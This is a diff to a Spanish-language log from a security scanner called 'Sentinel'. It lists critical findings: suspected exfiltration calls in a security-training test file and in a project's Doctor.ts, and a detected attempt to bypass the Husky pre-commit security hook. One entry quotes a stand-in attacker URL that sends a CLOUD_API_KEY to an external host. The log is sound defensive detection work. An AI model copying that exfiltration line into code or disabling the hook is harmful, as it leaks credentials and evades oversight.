@@ -120,3 +120,29 @@ Fecha: 2026-04-15T20:49:17.954Z
 [CRITICAL]	SOSPECHA DE EXFILTRACIÓN: Llamada de red con destino dinámico o externo no autorizado (`http://collect.predatore-hacker.com/log?data=${CLOUD_API_KEY}`).
 	Ubicación: tests/security_training/level_3/round_12_exfiltration.js:21
 	Solución : Añadir el dominio a la lista blanca o usar constantes para URLs externas.
+
+
+### INTRUSIÓN DETECTADA: 2026-04-16T20:30:03.420Z
+
+=== SENTINEL REPORT ===
+
+[CRITICAL]	SOSPECHA DE EXFILTRACIÓN: Llamada de red con destino dinámico o externo no autorizado (`${p.url}${key}`).
+	Ubicación: Sognatore/src/core/Doctor.ts:150
+	Solución : Añadir el dominio a la lista blanca o usar constantes para URLs externas.
+
+[CRITICAL]	SOSPECHA DE EXFILTRACIÓN: Llamada de red con destino dinámico o externo no autorizado (p.url).
+	Ubicación: Sognatore/src/core/Doctor.ts:154
+	Solución : Añadir el dominio a la lista blanca o usar constantes para URLs externas.
+
+[CRITICAL]	SOSPECHA DE EXFILTRACIÓN: Llamada de red con destino dinámico o externo no autorizado (p.url).
+	Ubicación: Sognatore/src/core/Doctor.ts:170
+	Solución : Añadir el dominio a la lista blanca o usar constantes para URLs externas.
+
+
+### INTRUSIÓN DETECTADA: 2026-04-16T20:32:07.857Z
+
+=== SENTINEL REPORT ===
+
+[CRITICAL]	ATAQUE A LA INTEGRIDAD: Se ha detectado un intento de eludir el motor de seguridad en Husky.
+	Ubicación: .husky/pre-commit
+	Solución : Restaurar la llamada a sentinel o lint-staged en el hook pre-commit.
